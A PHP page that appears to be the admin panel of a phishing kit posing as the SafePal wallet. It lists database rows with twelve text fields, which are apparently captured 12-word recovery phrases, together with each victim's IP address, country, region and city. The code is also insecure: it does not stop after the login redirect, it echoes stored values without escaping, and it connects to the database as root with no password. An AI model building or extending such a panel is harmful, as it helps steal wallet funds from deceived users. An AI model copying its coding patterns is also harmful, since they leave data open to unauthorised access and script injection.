<?php

session_start();

if(!isset($_SESSION['username']))
{
        header("location:login.php");
}


        $conn=mysqli_connect('localhost','root','','safepal');
        if(!$conn){
            echo "Connection failed";
        }
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DataTables Example</title>

    <!-- DataTables CSS -->
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.6/css/jquery.dataTables.css">

    <!-- DataTables JavaScript -->
    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.11.6/js/jquery.dataTables.js"></script>
  <!-- Bootstrap 5 CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css">
<!-- Data Table CSS -->
<link rel='stylesheet' href='https://cdn.datatables.net/1.13.5/css/dataTables.bootstrap5.min.css'>
<!-- Font Awesome CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css'>
<style>
  table {
        width: 200% !important;
        border-collapse: collapse;
        margin-top: 20px; /* Adjust margin as needed */
    }

    th, td {
        border: 1px solid #ddd;
        padding: 8px;
        text-align: left;
    }

    th {
        background-color: #f2f2f2;
    }

    tr:nth-child(even) {
        background-color: #f9f9f9;
    }
</style>
</head>
<body>

<?php
$sql = "Select * from popup ORDER BY id DESC";
$result = mysqli_query($conn, $sql);
$array = array();
while($fetch = mysqli_fetch_assoc($result)){
$array[]= $fetch;
}
    
?>
    <table id="example" class="table table-striped" style="width:230%">
        <thead>
            <tr>
            <th>I'D</th>
    <th>Text1</th>
    <th>Text2</th>
    <th>Text3</th>
    <th>Text4</th>
    <th>Text5</th>
    <th>Text6</th>
    <th>Text7</th>
    <th>Text8</th>
    <th>Text9</th>
    <th>Text10</th>
    <th>Text11</th>
    <th>Text12</th>
    <th>Time</th>
    <th>Date</th>
    <th>IP Address</th>
    <th>Contory</th>
    <th>Region</th>
    <th>City</th>
            </tr>
        </thead>
        <tbody>
        <?php
        foreach($array as $view){
?>

    <tr>
        <td>
        <?php
                echo $view['id'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text1'];
                ?>
        </td>
        <td><?php
                echo $view['text2'];
                ?>
                </td>
        <td>
        <?php
                echo $view['text3'];
                ?>
        </td>
        <td> 
        <?php
                echo $view['text4'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text5'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text6'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text7'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text8'];
                ?>
        </td>
        <td><?php
                echo $view['text9'];
                ?></td>
        <td>
        <?php
                echo $view['text10'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text11'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text12'];
                ?>
        </td>
        <td>
        <?php
                echo $view['time'];
                ?>
        </td>
        <td>
        <?php
                echo $view['date'];
                ?>
        </td>
        <td>
        <?php
                echo $view['ip'];
                ?>
        </td>
        <td>
        <?php
                echo $view['country'];
                ?>
        </td>
        <td>
        <?php
                echo $view['region'];
                ?>
        </td>
        <td>
        <?php
                echo $view['city'];
                ?>
        </td>
        
    </tr>
    <?php
        }
    ?>
        </tfoot>
    </table>
<!-- jQuery -->
<script src='https://code.jquery.com/jquery-3.7.0.js'></script>
<!-- Data Table JS -->
<script src='https://cdn.datatables.net/1.13.5/js/jquery.dataTables.min.js'></script>
<script src='https://cdn.datatables.net/responsive/2.1.0/js/dataTables.responsive.min.js'></script>
<script src='https://cdn.datatables.net/1.13.5/js/dataTables.bootstrap5.min.js'></script>
<script>
$(document).ready(function() {
    $('#example').DataTable({
      //disable sorting on last column
      "columnDefs": [
        { "orderable": false, "targets": 5 }
      ],
      language: {
        //customize pagination prev and next buttons: use arrows instead of words
        'paginate': {
          'previous': '<span class="fa fa-chevron-left"></span>',
          'next': '<span class="fa fa-chevron-right"></span>'
        },
        //customize number of elements to be displayed
        "lengthMenu": 'Display <select class="form-control input-sm">'+
        '<option value="10">10</option>'+
        '<option value="20">20</option>'+
        '<option value="30">30</option>'+
        '<option value="40">40</option>'+
        '<option value="50">50</option>'+
        '<option value="-1">All</option>'+
        '</select> results'
      }
    })  
} );
</script>
</body>
</html>
